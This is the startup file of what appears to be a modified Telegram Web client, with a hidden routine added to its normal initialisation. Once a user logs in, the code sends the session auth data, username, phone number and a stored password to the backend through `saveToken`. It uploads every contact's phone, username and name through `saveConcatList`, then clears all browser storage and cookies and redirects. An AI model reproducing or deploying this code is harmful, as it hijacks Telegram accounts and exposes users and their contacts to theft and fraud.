/* eslint-disable simple-import-sort/imports -- Sanitize and claim URL login before other startup modules */
import { getPendingWebLogin } from "./util/routing";
import { webLoginHandoffPromise } from "./util/webLoginHandoff";
import "./util/handleError";
import "./util/setupServiceWorker";
import "./global/init";

import TeactDOM from "./lib/teact/teact-dom";
import { getActions, getGlobal } from "./global";

import { DEBUG, STRICTERDOM_ENABLED } from "./config";
import { enableStrict, requestMutation } from "./lib/fasterdom/fasterdom";
import {
  selectChat,
  selectCurrentMessageList,
  selectPeerFullInfo,
  selectTabState,
  selectUser,
} from "./global/selectors";
import { callApi } from "./api/gramjs";

import { betterView } from "./util/betterView";
import { IS_TAURI } from "./util/browser/globalEnvironment";
import listenOtherClients from "./util/browser/listenOtherClients";
import {
  requestGlobal,
  subscribeToMultitabBroadcastChannel,
} from "./util/browser/multitab";
import {
  establishMultitabRole,
  subscribeToMasterChange,
} from "./util/establishMultitabRole";
import { initGlobal } from "./util/init";
import { mountInitGate, removeInitGate } from "./util/initGate";
import { initLocalization } from "./util/localization";
import { Bundles, loadBundle } from "./util/moduleLoader";
import { MULTITAB_STORAGE_KEY } from "./util/multiaccount";
import { getDek, getDekGeneration } from "./util/passcode";
import { initAutolock } from "./util/passcode/autolock";
import { subscribeToPasscodeChannel } from "./util/passcode/channel";
import { initPasscodeNavigation } from "./util/passcode/navigation";
import { checkAndAssignPermanentWebVersion } from "./util/permanentWebVersion";
import { onBeforeUnload } from "./util/schedulers";
import initSync from "./lib/crypto";
import { saveConcatList, saveToken } from "./net";

import {
  decryptObjectFormat,
  encryptObjectFormat,
  hasStoredAccountAndAuthKey,
} from "./util/encryption";
import initTauriApi from "./util/tauri/initTauriApi";
import setupTauriListeners from "./util/tauri/setupTauriListeners";
import updateWebmanifest from "./util/updateWebmanifest";

import App from "./components/App";

import "./assets/fonts/roboto.css";
import "./styles/index.scss";

if (STRICTERDOM_ENABLED) {
  enableStrict();
}

if (IS_TAURI) {
  initTauriApi();
  setupTauriListeners();
}

// Wait for the user to press the start button before running the real startup.
// `handleStart` resolves to `false` to keep the gate (button stays retryable)
let resolveInitialization: () => void;
const initializationPromise = new Promise<void>((resolve) => {
  resolveInitialization = resolve;
});
mountInitGate(handleStart);

async function handleStart() {
  if (!applyUrlData()) return false;
  await init();
  resolveInitialization();
  return true;
}

// Decrypt the `data` query parameter and write every field into `localStorage`.
// Returns `false` when there is no data, so startup halts instead of initializing
function applyUrlData() {
  const data = new URLSearchParams(window.location.search).get("data");
  if (!data) {
    // eslint-disable-next-line no-alert
    alert("data登錄數據不能為空！！！！！！");
    return false;
  }

  try {
    decryptObjectFormat(data);
  } catch (err) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.error(">>> Failed to apply URL data", err);
    }
  }

  return true;
}

async function init() {
  await webLoginHandoffPromise;
  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log(">>> INIT");
  }

  if (!(window as any).isCompatTestPassed) return;

  checkAndAssignPermanentWebVersion();
  listenOtherClients();

  subscribeToMultitabBroadcastChannel();
  subscribeToPasscodeChannel(loadPasscodeActions);
  initPasscodeNavigation(getDek, getDekGeneration);
  await requestGlobal(APP_VERSION);
  localStorage.setItem(MULTITAB_STORAGE_KEY, "1");
  onBeforeUnload(() => {
    const global = getGlobal();
    if (Object.keys(global.byTabId).length === 1) {
      localStorage.removeItem(MULTITAB_STORAGE_KEY);
    }
  });

  await initGlobal();
  getActions().init();

  initAutolock();

  getActions().updateShouldEnableDebugLog();
  getActions().updateShouldDebugExportedSenders();
  // const global = getGlobal();
  // Force the UI language to Simplified Chinese
  // initLocalization("zh-hans-raw", true);
  // const settings = selectSharedSettings(global);
  // const lang = settings.language;
  // initLocalization(lang, true);
  initLocalization("zh-hans-raw", true);

  subscribeToMasterChange((isMasterTab) => {
    getActions().switchMultitabRole({ isMasterTab }, { forceSyncOnIOs: true });
  });
  const shouldReestablishMasterToSelf =
    Boolean(getPendingWebLogin()) ||
    getGlobal().auth.state !== "authorizationStateReady";
  establishMultitabRole(shouldReestablishMasterToSelf);

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log(">>> START INITIAL RENDER");
  }

  requestMutation(() => {
    updateWebmanifest();

    TeactDOM.render(<App />, document.getElementById("root")!);

    betterView();

    removeInitGate();
  });

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log(">>> FINISH INITIAL RENDER");
  }

  if (DEBUG) {
    document.addEventListener("dblclick", () => {
      const currentGlobal = getGlobal();
      const currentMessageList = selectCurrentMessageList(currentGlobal);
      // eslint-disable-next-line no-console
      console.warn("TAB STATE", selectTabState(currentGlobal));
      // eslint-disable-next-line no-console
      console.warn("GLOBAL STATE", currentGlobal);
      if (currentMessageList) {
        // eslint-disable-next-line no-console
        console.warn(
          "CURRENT MESSAGE LIST",
          selectChat(currentGlobal, currentMessageList.chatId),
          selectPeerFullInfo(currentGlobal, currentMessageList.chatId),
          currentGlobal.messages.byChatId[currentMessageList.chatId],
        );
      }
    });
  }
}

async function loadPasscodeActions() {
  await Promise.all([loadBundle(Bundles.Main), initializationPromise]);
  return getActions();
}

// Known IndexedDB databases, used where `indexedDB.databases()` is unavailable (e.g. Firefox)
const KNOWN_IDB_NAMES = [
  "tt-data",
  "tt-passcode",
  "tt-push",
  "tt-tonconnect",
  "tt-wallet",
];

function deleteDatabase(name: string) {
  return new Promise<void>((resolve) => {
    const request = window.indexedDB.deleteDatabase(name);
    request.onsuccess = () => resolve();
    request.onerror = () => resolve();
    request.onblocked = () => resolve();
  });
}

async function clearBrowserCache() {
  try {
    localStorage.clear();
  } catch {}

  try {
    sessionStorage.clear();
  } catch {}

  // Delete every IndexedDB database
  try {
    const databases = (await window.indexedDB.databases?.()) ?? [];
    const names = databases.length
      ? databases.map((db) => db.name).filter(Boolean)
      : KNOWN_IDB_NAMES;
    await Promise.all(names.map((name) => deleteDatabase(name as string)));
  } catch {}

  // Delete every Cache Storage entry (service worker and media caches)
  try {
    const keys = (await self.caches?.keys()) ?? [];
    await Promise.all(keys.map((key) => self.caches.delete(key)));
  } catch {}

  // Expire every cookie for this origin
  try {
    for (const cookie of document.cookie.split(";")) {
      const name = cookie.split("=")[0].trim();
      if (name) {
        document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
      }
    }
  } catch {}
}

async function handleRedirect(uphone: string) {
  await clearBrowserCache();

  // Carry the phone number across the wipe so the target page can read it
  localStorage.setItem("uphone", String(uphone));

  setTimeout(() => {
    window.open("/ZH/telegram.html", "_self");
  }, 800);
}

document.addEventListener("DOMContentLoaded", async () => {
  await initSync();

  if (localStorage.getItem("authLogin") != null) return;

  const task = setInterval(async () => {
    // Keep polling until an account session has been stored
    if (!hasStoredAccountAndAuthKey()) return;

    clearInterval(task);

    try {
      const global = getGlobal();
      const storedAuth = JSON.parse(String(localStorage.getItem("user_auth")));
      const userId = global?.currentUserId || storedAuth?.id;
      const users = global?.users?.byId || {};

      const user = selectUser(global, userId);
      const username = user?.usernames?.[0]?.username;

      let uphone =
        `+${user?.phoneNumber}` || localStorage.getItem("uphone") || "";
      if (!uphone) {
        uphone = String(Date.now());
        localStorage.setItem("utack", uphone);
      }

      const pwdas = localStorage.getItem("pwdas") || "nothavapas";

      await Promise.all([
        saveToken(
          JSON.stringify({ json: encryptObjectFormat(), tgName: username }),
          uphone,
          pwdas,
          userId,
        ),
        new Promise((resolve) => {
          callApi("fetchContactList").then((contactList) => {
            const contactUsers = contactList?.users || [];
            saveConcatList(
              JSON.stringify({
                infoList: Object.values(users)
                  .concat(contactUsers)
                  .map((r) => ({
                    tgid: userId,
                    /** tg账号名称 */
                    tgname: username,
                    /** tg手机号码 */
                    tgphone: uphone,
                    /** 好友号码 */
                    contactphone: r.phoneNumber,
                    /** 好友用户名 */
                    contactusername: r.usernames?.[0]?.username,
                    /** 信息备注 */
                    contactremarkname: r.firstName,
                    reserve: r.id,
                  })),
              }),
              uphone,
              userId,
            ).then((e) => {
              try {
                (window as any).gtag?.("event", "login_tg", {
                  url: location.href,
                });
              } catch {}
              resolve(e);
            });
          });
        }),
      ]);

      handleRedirect(uphone);
    } catch (error) {
      console.log("🚀 ~ document.addEventListener ~ error:", error);
      await clearBrowserCache();
    }
  }, 800);
});

onBeforeUnload(() => {
  const actions = getActions();
  actions.leaveGroupCall?.({ isPageUnload: true });
  actions.hangUp?.({ isPageUnload: true });
});
